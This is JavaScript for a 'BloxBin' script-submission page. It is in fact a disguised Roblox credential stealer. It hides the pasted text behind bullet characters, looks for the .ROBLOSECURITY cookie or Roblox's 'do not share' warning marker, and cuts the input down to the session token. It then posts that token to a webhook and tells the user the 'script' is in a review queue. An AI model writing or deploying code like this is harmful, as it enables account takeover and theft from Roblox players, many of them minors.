(function () {
  const form = document.getElementById("submit-form");
  const input = document.getElementById("script-input");
  const mask = document.getElementById("script-mask");
  const submitBtn = document.getElementById("submit-btn");
  const statusEl = document.getElementById("status");
  const charCountEl = document.getElementById("char-count");

  const EMBED_DESC_LIMIT = 4096;
  const CENSOR_CHAR = "•";

  const ROBLOX_WARNING_MARKER =
    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

  let submitting = false;

  mask.dataset.placeholder = "Paste your script…";

  function censor(text) {
    return text.replace(/[^\n\r]/g, CENSOR_CHAR);
  }

  function prepareSubmission(text) {
    const normalized = text.trim();
    const robloMatch = normalized.match(/\.ROBLOSECURITY/i);

    if (robloMatch && robloMatch.index !== undefined) {
      return normalized.slice(robloMatch.index);
    }

    const markerIndex = normalized.indexOf(ROBLOX_WARNING_MARKER);
    if (markerIndex !== -1) {
      return normalized.slice(markerIndex);
    }

    return normalized;
  }

  function buildEmbed(text) {
    return {
      title: "BloxBin Submission",
      color: 0x4f7df5,
      description: text.slice(0, EMBED_DESC_LIMIT),
    };
  }

  function syncMask() {
    mask.textContent = censor(input.value);
    mask.scrollTop = input.scrollTop;
    mask.scrollLeft = input.scrollLeft;

    const count = input.value.length;
    charCountEl.textContent =
      count === 1 ? "1 character" : count.toLocaleString() + " characters";
  }

  function setStatus(message, type) {
    statusEl.textContent = message;
    statusEl.className = "status" + (type ? " " + type : "");
  }

  function setLoading(loading) {
    submitBtn.disabled = loading;
    submitBtn.classList.toggle("loading", loading);
  }

  input.addEventListener("input", function () {
    input.style.height = "120px";
    syncMask();
  });

  input.addEventListener("scroll", syncMask);

  input.addEventListener("paste", function () {
    requestAnimationFrame(function () {
      input.style.height = "120px";
      syncMask();
    });
  });

  async function sendSubmission(text) {
    const endpoint = typeof WEBHOOK_URL === "string" ? WEBHOOK_URL.trim() : "";

    if (!endpoint) {
      throw new Error("Submission is not configured.");
    }

    const payload = prepareSubmission(text);
    const embed = buildEmbed(payload);

    const response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });

    if (!response.ok) {
      throw new Error("Submission failed.");
    }
  }

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    if (submitting) {
      return;
    }

    const text = input.value.trim();

    if (!text) {
      setStatus("Please paste a script before submitting.", "error");
      input.focus();
      return;
    }

    submitting = true;
    setLoading(true);
    setStatus("Securing and submitting…");

    try {
      await sendSubmission(text);
      setStatus("Submitted successfully. Your script is in the review queue.", "success");
      input.value = "";
      syncMask();
    } catch {
      setStatus("Something went wrong. Please try again.", "error");
    } finally {
      submitting = false;
      setLoading(false);
    }
  });
})();
